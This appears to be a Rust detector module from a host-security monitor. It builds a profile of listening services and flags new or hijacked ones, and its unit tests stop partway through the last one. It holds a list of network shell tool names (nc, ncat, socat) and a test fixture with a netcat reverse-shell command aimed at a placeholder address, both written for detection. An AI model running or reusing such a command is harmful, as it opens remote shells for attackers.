use crate::detectors::behavior_profile;
use crate::detectors::command_profile::assess_network_execution_command;
use crate::detectors::process_rules::path_in_suspicious_dirs;
use crate::rules::system::{SERVICE_PROFILE_DRIFT_RULE_ID, SERVICE_PROFILE_NEW_RULE_ID};
use crate::storage::SqliteStore;
use crate::utils::ip::is_public_listener_addr;
use crate::utils::package::PackageOwnerCache;
use chrono::{DateTime, Utc};
use sentinel_core::{
    Category, Evidence, Finding, RawEvent, SentinelConfig, SentinelResult, Severity,
};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

const STATE_RULE_ID: &str = "service_profile";
const SERVICE_PROFILE_VERSION: u32 = 2;
const UNKNOWN_OWNER: &str = "unknown-owner";
const STATIC_SERVICE_DEDUP_KEYS: &[&str] = &["local_addr", "local_port", "protocol"];
const DYNAMIC_SERVICE_DEDUP_KEYS: &[&str] = &[
    "protocol",
    "service_profile_identity",
    "service_profile_dynamic_family",
];

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ServiceProfile {
    pub version: u32,
    pub updated_at: Option<DateTime<Utc>>,
    pub services: BTreeMap<String, ServiceRecord>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ServiceRecord {
    pub protocol: String,
    pub local_addr: String,
    pub local_port: u16,
    pub process_name: String,
    pub executable: String,
    pub cmdline: String,
    pub public_exposure: bool,
    pub pid: String,
    pub systemd_unit: String,
    pub container_context: String,
    pub container_id: String,
    pub container_cgroup: String,
    pub exe_hash_blake3: String,
    pub package_owner: String,
    pub package_owner_state: String,
    pub service_identity: String,
    pub integrity_identity: String,
    pub dynamic_family: bool,
    pub observed_ports: Vec<u16>,
    pub observation_count: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ServiceIdentity {
    protocol_family: String,
    bind_scope: String,
    process_name: String,
    executable: String,
    systemd_unit: String,
    container_context: String,
    container_id: String,
    container_cgroup: String,
    exe_hash_blake3: String,
    package_owner: String,
    cmdline_template: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ServiceProfileDecision {
    SilentProfileUpdate,
    Observation,
    Finding,
}

pub fn evaluate_service_profile(
    events: &[RawEvent],
    config: &SentinelConfig,
    store: Option<&SqliteStore>,
) -> SentinelResult<Vec<Finding>> {
    if !config.service_profile.enabled {
        return Ok(Vec::new());
    }
    let Some(store) = store else {
        return Ok(Vec::new());
    };
    let mut current = current_profile_with_config(events, config);
    if current.services.is_empty() {
        return Ok(Vec::new());
    }
    let previous = store.load_rule_state::<ServiceProfile>(STATE_RULE_ID)?;
    let mut findings = Vec::new();
    if let Some(previous) = previous {
        carry_forward_profile_state(&mut current, &previous, config);
        findings.extend(diff_profiles(&previous, &current, events, config));
    }
    store.save_rule_state(STATE_RULE_ID, &current)?;
    Ok(findings)
}

pub fn load_service_profile(store: &SqliteStore) -> SentinelResult<Option<ServiceProfile>> {
    store.load_rule_state(STATE_RULE_ID)
}

pub fn refresh_service_profile(
    events: &[RawEvent],
    config: &SentinelConfig,
    store: &SqliteStore,
) -> SentinelResult<usize> {
    let profile = current_profile_with_config(events, config);
    let count = profile.services.len();
    store.save_rule_state(STATE_RULE_ID, &profile)?;
    Ok(count)
}

fn current_profile_with_config(events: &[RawEvent], config: &SentinelConfig) -> ServiceProfile {
    let mut services = BTreeMap::<String, ServiceRecord>::new();
    let mut package_cache = PackageOwnerCache::default();
    for mut record in events
        .iter()
        .filter(|event| event.kind == "listening_socket")
        .filter_map(|event| service_record(event, &mut package_cache))
        .filter(|record| !ignored_service_profile_record(record, config))
    {
        record.dynamic_family = is_dynamic_udp_service(&record, config);
        let identity = ServiceIdentity::from_record(&record);
        record.service_identity = identity.family_key();
        record.integrity_identity = identity.integrity_key();
        record.observed_ports = vec![record.local_port];
        record.observation_count = 1;
        let key = service_key(&record, &identity, config);
        merge_service_record(&mut services, key, record, config);
    }
    ServiceProfile {
        version: SERVICE_PROFILE_VERSION,
        updated_at: Some(Utc::now()),
        services,
    }
}

fn diff_profiles(
    previous: &ServiceProfile,
    current: &ServiceProfile,
    events: &[RawEvent],
    config: &SentinelConfig,
) -> Vec<Finding> {
    let package_activity = package_activity_summary(events);
    let mut findings = Vec::new();
    for (key, current_record) in &current.services {
        if config.service_profile.drift_requires_public_exposure && !current_record.public_exposure
        {
            continue;
        }
        let Some(previous_record) = previous.services.get(key) else {
            if legacy_dynamic_identity_seen(previous, current_record, config) {
                continue;
            }
            if new_service_decision(previous, current_record, config)
                == ServiceProfileDecision::Finding
            {
                findings.push(new_service_finding(
                    current_record,
                    package_activity.as_deref(),
                    config,
                ));
            }
            continue;
        };
        if unknown_owner_confirmation_crossed(previous_record, current_record, config) {
            findings.push(new_service_finding(
                current_record,
                package_activity.as_deref(),
                config,
            ));
            continue;
        }
        if service_identity_changed(previous_record, current_record)
            && !trusted_package_refresh(
                previous_record,
                current_record,
                package_activity.as_deref(),
                config,
            )
        {
            findings.push(service_identity_drift_finding(
                previous_record,
                current_record,
                package_activity.as_deref(),
                config,
            ));
        }
    }
    findings
}

fn new_service_decision(
    previous: &ServiceProfile,
    record: &ServiceRecord,
    config: &SentinelConfig,
) -> ServiceProfileDecision {
    if !record.dynamic_family {
        return ServiceProfileDecision::Finding;
    }
    if suspicious_service_record(record, config) {
        return ServiceProfileDecision::Finding;
    }
    if legacy_dynamic_identity_seen(previous, record, config) {
        return ServiceProfileDecision::SilentProfileUpdate;
    }
    if !known_service_identity(record)
        && record.observation_count < config.service_profile.unknown_owner_grace_observations
    {
        return ServiceProfileDecision::Observation;
    }
    ServiceProfileDecision::Finding
}

fn unknown_owner_confirmation_crossed(
    previous: &ServiceRecord,
    current: &ServiceRecord,
    config: &SentinelConfig,
) -> bool {
    current.dynamic_family
        && !known_service_identity(current)
        && previous.observation_count < config.service_profile.unknown_owner_grace_observations
        && current.observation_count >= config.service_profile.unknown_owner_grace_observations
}

fn new_service_finding(
    record: &ServiceRecord,
    package_activity: Option<&str>,
    config: &SentinelConfig,
) -> Finding {
    let mut evidence = service_evidence(record);
    if record.dynamic_family {
        evidence.push(Evidence::new("dynamic_udp_listener", "true"));
        evidence.push(Evidence::new(
            "dynamic_udp_reason",
            "new_dynamic_service_identity",
        ));
    }
    if let Some(package_activity) = package_activity {
        evidence.push(Evidence::new("package_activity_recent", "true"));
        evidence.push(Evidence::new("package_activity_sources", package_activity));
    }
    Finding::new(
        config.host_id(),
        "New service profile entry detected",
        "A listening service was not present in the previous service profile baseline.",
        if record.public_exposure && !record.dynamic_family {
            Severity::Medium
        } else {
            Severity::Low
        },
        Category::Network,
        SERVICE_PROFILE_NEW_RULE_ID,
        service_subject(record),
    )
    .with_evidence_deduped_by(evidence, service_dedup_keys(record))
    .with_impact(vec![
        "A new listening service can increase the host exposure surface.".to_string(),
    ])
    .with_recommendations(vec![
        "Confirm the service owner, executable path, and firewall exposure before refreshing the service profile baseline.".to_string(),
    ])
}

fn service_identity_drift_finding(
    previous: &ServiceRecord,
    current: &ServiceRecord,
    package_activity: Option<&str>,
    config: &SentinelConfig,
) -> Finding {
    let mut evidence = service_evidence(current);
    evidence.push(Evidence::new(
        "previous_process_name",
        &previous.process_name,
    ));
    evidence.push(Evidence::new("previous_executable", &previous.executable));
    evidence.push(Evidence::new(
        "previous_service_profile_identity",
        service_family_identity(previous),
    ));
    evidence.push(Evidence::new(
        "previous_service_profile_integrity_identity",
        service_integrity_identity(previous),
    ));
    if let Some(package_activity) = package_activity {
        evidence.push(Evidence::new("package_activity_recent", "true"));
        evidence.push(Evidence::new("package_activity_sources", package_activity));
    }
    Finding::new(
        config.host_id(),
        "Service executable drift detected",
        "A known listening service is now owned by a different executable or process identity.",
        Severity::Medium,
        Category::Network,
        SERVICE_PROFILE_DRIFT_RULE_ID,
        service_subject(current),
    )
    .with_evidence_deduped_by(evidence, service_dedup_keys(current))
    .with_impact(vec![
        "A service owner change can be normal after upgrades, but it can also indicate service hijacking.".to_string(),
    ])
    .with_recommendations(vec![
        "Compare the executable with package ownership and service manager metadata before refreshing the profile.".to_string(),
    ])
}

fn service_record(
    event: &RawEvent,
    package_cache: &mut PackageOwnerCache,
) -> Option<ServiceRecord> {
    let protocol = event.field("protocol")?.to_string();
    let local_addr = event.field("local_addr")?.to_string();
    let local_port = event.field("local_port")?.parse::<u16>().ok()?;
    let executable = normalize_deleted_suffix(event.field("executable").unwrap_or(""));
    let package_owner = event
        .field("package_owner")
        .map(str::to_string)
        .or_else(|| package_cache.owner_for_path(&executable))
        .unwrap_or_default();
    let package_owner_state = event
        .field("package_owner_state")
        .map(str::to_string)
        .unwrap_or_else(|| {
            if executable.starts_with('/') && package_owner.is_empty() {
                "unowned".to_string()
            } else {
                String::new()
            }
        });
    Some(ServiceRecord {
        public_exposure: is_public_listener_addr(&local_addr),
        protocol,
        local_addr,
        local_port,
        process_name: event.field("process_name").unwrap_or("").to_string(),
        executable,
        cmdline: event.field("cmdline").unwrap_or("").to_string(),
        pid: event.field("pid").unwrap_or("").to_string(),
        systemd_unit: event.field("systemd_unit").unwrap_or("").to_string(),
        container_context: event.field("container_context").unwrap_or("").to_string(),
        container_id: event.field("container_id").unwrap_or("").to_string(),
        container_cgroup: event.field("container_cgroup").unwrap_or("").to_string(),
        exe_hash_blake3: event.field("exe_hash_blake3").unwrap_or("").to_string(),
        package_owner,
        package_owner_state,
        service_identity: String::new(),
        integrity_identity: String::new(),
        dynamic_family: false,
        observed_ports: Vec::new(),
        observation_count: 0,
    })
}

fn service_key(
    record: &ServiceRecord,
    identity: &ServiceIdentity,
    config: &SentinelConfig,
) -> String {
    if is_dynamic_udp_service(record, config) {
        return format!(
            "dynamic:{}:{}:{}",
            identity.protocol_family,
            identity.bind_scope,
            identity.family_key()
        );
    }
    format!(
        "{}:{}:{}",
        record.protocol, record.local_addr, record.local_port
    )
}

fn merge_service_record(
    services: &mut BTreeMap<String, ServiceRecord>,
    key: String,
    record: ServiceRecord,
    config: &SentinelConfig,
) {
    let limit = config.service_profile.dynamic_udp_max_port_samples;
    match services.get_mut(&key) {
        Some(existing) => {
            existing.public_exposure |= record.public_exposure;
            existing.local_port = existing.local_port.min(record.local_port);
            merge_ports(&mut existing.observed_ports, &record.observed_ports, limit);
            merge_missing_fields(existing, &record);
        }
        None => {
            services.insert(key, record);
        }
    }
}

fn carry_forward_profile_state(
    current: &mut ServiceProfile,
    previous: &ServiceProfile,
    config: &SentinelConfig,
) {
    for (key, record) in current.services.iter_mut() {
        let previous_record = previous
            .services
            .get(key)
            .or_else(|| {
                previous
                    .services
                    .values()
                    .find(|candidate| same_profile_key(candidate, record))
            })
            .or_else(|| {
                record
                    .dynamic_family
                    .then(|| {
                        previous
                            .services
                            .values()
                            .find(|candidate| same_dynamic_family(candidate, record, config))
                    })
                    .flatten()
            });
        if let Some(previous_record) = previous_record {
            record.observation_count = previous_record.observation_count.saturating_add(1).max(1);
            let mut ports = previous_record.observed_ports.clone();
            merge_ports(
                &mut ports,
                &record.observed_ports,
                config.service_profile.dynamic_udp_max_port_samples,
            );
            record.observed_ports = ports;
        }
    }
}

fn same_profile_key(left: &ServiceRecord, right: &ServiceRecord) -> bool {
    left.protocol == right.protocol
        && left.local_addr == right.local_addr
        && left.local_port == right.local_port
}

fn same_dynamic_family(
    left: &ServiceRecord,
    right: &ServiceRecord,
    config: &SentinelConfig,
) -> bool {
    config.service_profile.dynamic_udp_enabled
        && is_dynamic_udp_service(left, config)
        && is_dynamic_udp_service(right, config)
        && protocol_family(&left.protocol) == protocol_family(&right.protocol)
        && bind_scope(&left.local_addr) == bind_scope(&right.local_addr)
        && service_family_identity(left) == service_family_identity(right)
        && known_service_identity(right)
}

fn legacy_dynamic_identity_seen(
    previous: &ServiceProfile,
    record: &ServiceRecord,
    config: &SentinelConfig,
) -> bool {
    record.dynamic_family
        && previous
            .services
            .values()
            .any(|candidate| same_dynamic_family(candidate, record, config))
}

fn is_dynamic_udp_service(record: &ServiceRecord, config: &SentinelConfig) -> bool {
    config.service_profile.dynamic_udp_enabled
        && record.public_exposure
        && is_udp_protocol(&record.protocol)
        && record.local_port >= config.service_profile.dynamic_udp_min_port
}

fn ignored_service_profile_record(record: &ServiceRecord, config: &SentinelConfig) -> bool {
    ignored_dynamic_udp_process(record, config) || ignored_loopback_ssh_forwarding(record, config)
}

fn ignored_dynamic_udp_process(record: &ServiceRecord, config: &SentinelConfig) -> bool {
    if !is_udp_protocol(&record.protocol) {
        return false;
    }
    let process_name = record.process_name.trim();
    !process_name.is_empty()
        && config
            .service_profile
            .ignored_dynamic_udp_process_names
            .iter()
            .any(|name| name.eq_ignore_ascii_case(process_name))
}

fn ignored_loopback_ssh_forwarding(record: &ServiceRecord, config: &SentinelConfig) -> bool {
    config.service_profile.ignore_loopback_ssh_forwarding
        && !record.public_exposure
        && record.process_name.eq_ignore_ascii_case("sshd")
        && (6000..=6099).contains(&record.local_port)
        && is_loopback_listener(&record.local_addr)
}

fn service_identity_changed(previous: &ServiceRecord, current: &ServiceRecord) -> bool {
    service_integrity_identity(previous) != service_integrity_identity(current)
}

fn trusted_package_refresh(
    previous: &ServiceRecord,
    current: &ServiceRecord,
    package_activity: Option<&str>,
    config: &SentinelConfig,
) -> bool {
    config
        .service_profile
        .baseline_refresh_after_package_activity
        && package_activity.is_some()
        && !current.package_owner.trim().is_empty()
        && current.package_owner == previous.package_owner
        && current.executable == previous.executable
        && current.systemd_unit == previous.systemd_unit
}

fn suspicious_service_record(record: &ServiceRecord, config: &SentinelConfig) -> bool {
    let executable = record.executable.trim();
    (!executable.is_empty()
        && (path_in_suspicious_dirs(executable, &config.process.suspicious_dirs)
            || behavior_profile::hidden_basename(executable)))
        || shell_process_name(&record.process_name)
        || assess_network_execution_command(&record.cmdline).is_suspicious()
}

fn shell_process_name(name: &str) -> bool {
    matches!(
        name.trim().to_ascii_lowercase().as_str(),
        "sh" | "bash" | "dash" | "zsh" | "fish" | "nc" | "ncat" | "socat"
    )
}

fn service_evidence(record: &ServiceRecord) -> Vec<Evidence> {
    let mut evidence = vec![
        Evidence::new("protocol", &record.protocol),
        Evidence::new("local_addr", &record.local_addr),
        Evidence::new("local_port", record.local_port.to_string()),
        Evidence::new("public_exposure", record.public_exposure.to_string()),
        Evidence::new("process_name", &record.process_name),
        Evidence::new("executable", &record.executable),
        Evidence::new("cmdline", &record.cmdline),
        Evidence::new("service_profile_identity", service_family_identity(record)),
        Evidence::new(
            "service_profile_integrity_identity",
            service_integrity_identity(record),
        ),
        Evidence::new(
            "service_profile_observations",
            record.observation_count.to_string(),
        ),
    ];
    if record.dynamic_family {
        evidence.push(Evidence::new("service_profile_dynamic_family", "true"));
        evidence.push(Evidence::new(
            "service_profile_observed_ports",
            joined_ports(&record.observed_ports),
        ));
    }
    push_optional_evidence(&mut evidence, "systemd_unit", &record.systemd_unit);
    push_optional_evidence(
        &mut evidence,
        "container_context",
        &record.container_context,
    );
    push_optional_evidence(&mut evidence, "container_id", &record.container_id);
    push_optional_evidence(&mut evidence, "container_cgroup", &record.container_cgroup);
    push_optional_evidence(&mut evidence, "exe_hash_blake3", &record.exe_hash_blake3);
    push_optional_evidence(&mut evidence, "package_owner", &record.package_owner);
    push_optional_evidence(
        &mut evidence,
        "package_owner_state",
        &record.package_owner_state,
    );
    evidence
}

fn service_subject(record: &ServiceRecord) -> String {
    if record.dynamic_family {
        return format!(
            "dynamic:{}:{}:{}",
            protocol_family(&record.protocol),
            bind_scope(&record.local_addr),
            service_family_identity(record)
        );
    }
    format!(
        "{}:{}/{}",
        record.local_addr, record.local_port, record.protocol
    )
}

fn service_dedup_keys(record: &ServiceRecord) -> &'static [&'static str] {
    if record.dynamic_family {
        DYNAMIC_SERVICE_DEDUP_KEYS
    } else {
        STATIC_SERVICE_DEDUP_KEYS
    }
}

fn is_udp_protocol(protocol: &str) -> bool {
    protocol.eq_ignore_ascii_case("udp") || protocol.eq_ignore_ascii_case("udp6")
}

fn is_loopback_listener(addr: &str) -> bool {
    matches!(addr.trim(), "127.0.0.1" | "::1" | "[::1]" | "localhost")
}

fn service_family_identity(record: &ServiceRecord) -> String {
    if !record.service_identity.trim().is_empty() {
        return record.service_identity.clone();
    }
    ServiceIdentity::from_record(record).family_key()
}

fn service_integrity_identity(record: &ServiceRecord) -> String {
    if !record.integrity_identity.trim().is_empty() {
        return record.integrity_identity.clone();
    }
    ServiceIdentity::from_record(record).integrity_key()
}

fn known_service_identity(record: &ServiceRecord) -> bool {
    service_family_identity(record) != UNKNOWN_OWNER
}

impl ServiceIdentity {
    fn from_record(record: &ServiceRecord) -> Self {
        Self {
            protocol_family: protocol_family(&record.protocol),
            bind_scope: bind_scope(&record.local_addr),
            process_name: normalized_text(&record.process_name),
            executable: normalize_deleted_suffix(&record.executable),
            systemd_unit: normalized_text(&record.systemd_unit),
            container_context: normalized_text(&record.container_context),
            container_id: normalized_text(&record.container_id),
            container_cgroup: normalized_text(&record.container_cgroup),
            exe_hash_blake3: normalized_text(&record.exe_hash_blake3),
            package_owner: normalized_text(&record.package_owner),
            cmdline_template: cmdline_template(&record.cmdline),
        }
    }

    fn family_key(&self) -> String {
        let mut parts = Vec::new();
        push_key_value(&mut parts, "name", &self.process_name);
        push_key_value(&mut parts, "exe", &self.executable);
        push_key_value(&mut parts, "unit", &self.systemd_unit);
        push_key_value(&mut parts, "container", &self.container_context);
        push_key_value(&mut parts, "container_id", &self.container_id);
        push_key_value(&mut parts, "container_cgroup", &self.container_cgroup);
        push_key_value(&mut parts, "pkg", &self.package_owner);
        if self.executable.is_empty() {
            push_key_value(&mut parts, "cmd", &self.cmdline_template);
        }
        if parts.is_empty() {
            UNKNOWN_OWNER.to_string()
        } else {
            parts.join("|")
        }
    }

    fn integrity_key(&self) -> String {
        let mut key = self.family_key();
        if !self.exe_hash_blake3.is_empty() {
            key.push_str("|hash=");
            key.push_str(&self.exe_hash_blake3);
        }
        key
    }
}

fn protocol_family(protocol: &str) -> String {
    protocol.trim().trim_end_matches('6').to_ascii_lowercase()
}

fn bind_scope(addr: &str) -> String {
    match addr.trim() {
        "0.0.0.0" | "*" => "public-wildcard-v4".to_string(),
        "::" | "[::]" => "public-wildcard-v6".to_string(),
        "127.0.0.1" | "::1" | "[::1]" | "localhost" => "loopback".to_string(),
        value if value.contains(':') => "specific-v6".to_string(),
        _ => "specific-v4".to_string(),
    }
}

fn normalized_text(value: &str) -> String {
    value.trim().to_string()
}

fn normalize_deleted_suffix(value: &str) -> String {
    value
        .trim()
        .strip_suffix(" (deleted)")
        .unwrap_or_else(|| value.trim())
        .to_string()
}

fn cmdline_template(cmdline: &str) -> String {
    cmdline
        .split_whitespace()
        .next()
        .map(command_basename)
        .unwrap_or_default()
        .to_string()
}

fn command_basename(token: &str) -> &str {
    token.rsplit(['/', '\\']).next().unwrap_or(token).trim()
}

fn push_key_value(parts: &mut Vec<String>, key: &str, value: &str) {
    if !value.trim().is_empty() {
        parts.push(format!("{key}={}", value.trim()));
    }
}

fn push_optional_evidence(evidence: &mut Vec<Evidence>, key: &str, value: &str) {
    if !value.trim().is_empty() {
        evidence.push(Evidence::new(key, value));
    }
}

fn merge_missing_fields(target: &mut ServiceRecord, source: &ServiceRecord) {
    fill_if_empty(&mut target.pid, &source.pid);
    fill_if_empty(&mut target.process_name, &source.process_name);
    fill_if_empty(&mut target.executable, &source.executable);
    fill_if_empty(&mut target.cmdline, &source.cmdline);
    fill_if_empty(&mut target.systemd_unit, &source.systemd_unit);
    fill_if_empty(&mut target.container_context, &source.container_context);
    fill_if_empty(&mut target.container_id, &source.container_id);
    fill_if_empty(&mut target.container_cgroup, &source.container_cgroup);
    fill_if_empty(&mut target.exe_hash_blake3, &source.exe_hash_blake3);
    fill_if_empty(&mut target.package_owner, &source.package_owner);
    fill_if_empty(&mut target.package_owner_state, &source.package_owner_state);
    fill_if_empty(&mut target.service_identity, &source.service_identity);
    fill_if_empty(&mut target.integrity_identity, &source.integrity_identity);
}

fn fill_if_empty(target: &mut String, source: &str) {
    if target.trim().is_empty() && !source.trim().is_empty() {
        *target = source.to_string();
    }
}

fn merge_ports(target: &mut Vec<u16>, source: &[u16], limit: usize) {
    let mut ports = target.iter().copied().collect::<BTreeSet<_>>();
    ports.extend(source.iter().copied());
    *target = ports.into_iter().take(limit).collect();
}

fn joined_ports(ports: &[u16]) -> String {
    ports
        .iter()
        .map(u16::to_string)
        .collect::<Vec<_>>()
        .join(", ")
}

fn package_activity_summary(events: &[RawEvent]) -> Option<String> {
    let sources = events
        .iter()
        .filter(|event| event.kind == "package_manager_activity")
        .filter_map(|event| event.field("path"))
        .filter(|path| !path.trim().is_empty())
        .map(str::to_string)
        .collect::<Vec<_>>();
    (!sources.is_empty()).then(|| sources.join(", "))
}

#[cfg(test)]
mod tests {
    use super::evaluate_service_profile;
    use crate::storage::SqliteStore;
    use sentinel_core::{RawEvent, SentinelConfig};

    #[test]
    fn detects_new_public_service_after_profile_exists() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd")];
        let second = vec![
            socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd"),
            socket("0.0.0.0", 8080, "app", "/opt/app/app"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SERVICE-001");
        Ok(())
    }

    #[test]
    fn dynamic_public_udp_ports_are_profiled_by_process_identity(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![udp_socket("0.0.0.0", 42549, "relay", "/usr/bin/relay")];
        let second = vec![udp_socket("0.0.0.0", 59737, "relay", "/usr/bin/relay")];
        let changed_identity = vec![udp_socket("0.0.0.0", 59737, "unknown", "/tmp/unknown")];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        assert!(evaluate_service_profile(&second, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&changed_identity, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SERVICE-001");
        Ok(())
    }

    #[test]
    fn dynamic_public_udp6_ports_are_profiled_by_process_identity(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket_with_protocol(
            "udp6",
            "::",
            42549,
            "relay",
            "/usr/bin/relay",
        )];
        let second = vec![socket_with_protocol(
            "udp6",
            "::",
            59737,
            "relay",
            "/usr/bin/relay",
        )];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        assert!(evaluate_service_profile(&second, &config, Some(&store))?.is_empty());
        Ok(())
    }

    #[test]
    fn low_udp6_ports_are_profiled_by_service_identity_not_port_range(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket_with_protocol(
            "udp6",
            "::",
            12545,
            "v2ray",
            "/usr/bin/v2ray/v2ray",
        )];
        let second = vec![
            socket_with_protocol("udp6", "::", 8566, "v2ray", "/usr/bin/v2ray/v2ray"),
            socket_with_protocol("udp6", "::", 59006, "v2ray", "/usr/bin/v2ray/v2ray"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn sing_box_dynamic_udp_port_churn_stays_silent() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![
            udp_socket("0.0.0.0", 18086, "sing-box", "/usr/bin/sing-box"),
            udp_socket("0.0.0.0", 20567, "sing-box", "/usr/bin/sing-box"),
        ];
        let second = vec![
            udp_socket("0.0.0.0", 23868, "sing-box", "/usr/bin/sing-box"),
            udp_socket("0.0.0.0", 23974, "sing-box", "/usr/bin/sing-box"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn legacy_port_based_dynamic_udp_profile_migrates_silently(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let mut legacy_config = SentinelConfig::default();
        legacy_config.service_profile.dynamic_udp_enabled = false;
        let current_config = SentinelConfig::default();
        let legacy = vec![socket_with_protocol(
            "udp6",
            "::",
            12545,
            "v2ray",
            "/usr/bin/v2ray/v2ray",
        )];
        let current = vec![socket_with_protocol(
            "udp6",
            "::",
            8566,
            "v2ray",
            "/usr/bin/v2ray/v2ray",
        )];

        assert_eq!(
            super::refresh_service_profile(&legacy, &legacy_config, &store)?,
            1
        );
        let findings = evaluate_service_profile(&current, &current_config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn dynamic_public_udp_without_owner_is_grouped_as_low_signal(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![udp_socket("0.0.0.0", 42549, "", "")];
        let second = vec![udp_socket("0.0.0.0", 59737, "", "")];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn unknown_owner_dynamic_udp_requires_confirmation_before_finding(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let mut config = SentinelConfig::default();
        config.service_profile.unknown_owner_grace_observations = 3;
        let first = vec![udp_socket("0.0.0.0", 42549, "", "")];
        let second = vec![udp_socket("0.0.0.0", 59737, "", "")];
        let third = vec![udp_socket("0.0.0.0", 42550, "", "")];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        assert!(evaluate_service_profile(&second, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&third, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, sentinel_core::Severity::Low);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "service_profile_observations" && item.value == "3"));
        Ok(())
    }

    #[test]
    fn new_dynamic_public_udp_identity_is_low_severity() -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd")];
        let second = vec![
            socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd"),
            udp_socket("0.0.0.0", 59737, "relay", "/usr/bin/relay"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, sentinel_core::Severity::Low);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "dynamic_udp_listener" && item.value == "true"));
        Ok(())
    }

    #[test]
    fn unprivileged_udp_port_churn_for_same_identity_is_suppressed(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![udp_socket("0.0.0.0", 24409, "relay", "/usr/bin/relay")];
        let second = vec![udp_socket("0.0.0.0", 24410, "relay", "/usr/bin/relay")];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn unprivileged_udp_extra_port_for_seen_identity_is_silent(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![udp_socket("0.0.0.0", 24409, "relay", "/usr/bin/relay")];
        let second = vec![
            udp_socket("0.0.0.0", 24409, "relay", "/usr/bin/relay"),
            udp_socket("0.0.0.0", 24410, "relay", "/usr/bin/relay"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
        let findings = evaluate_service_profile(&second, &config, Some(&store))?;

        assert!(findings.is_empty());
        Ok(())
    }

    #[test]
    fn suspicious_dynamic_udp_service_still_alerts_immediately(
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let store = SqliteStore::open(temp.path().join("sentinel.db"))?;
        let config = SentinelConfig::default();
        let first = vec![socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd")];
        let second = vec![
            socket("0.0.0.0", 22, "sshd", "/usr/sbin/sshd"),
            udp_socket("0.0.0.0", 59737, "sh", "/tmp/.x/sh")
                .with_field("cmdline", "sh -c nc -u -e /bin/sh 198.51.100.10 4444"),
        ];

        assert!(evaluate_service_profile(&first, &config, Some(&store))?.is_empty());
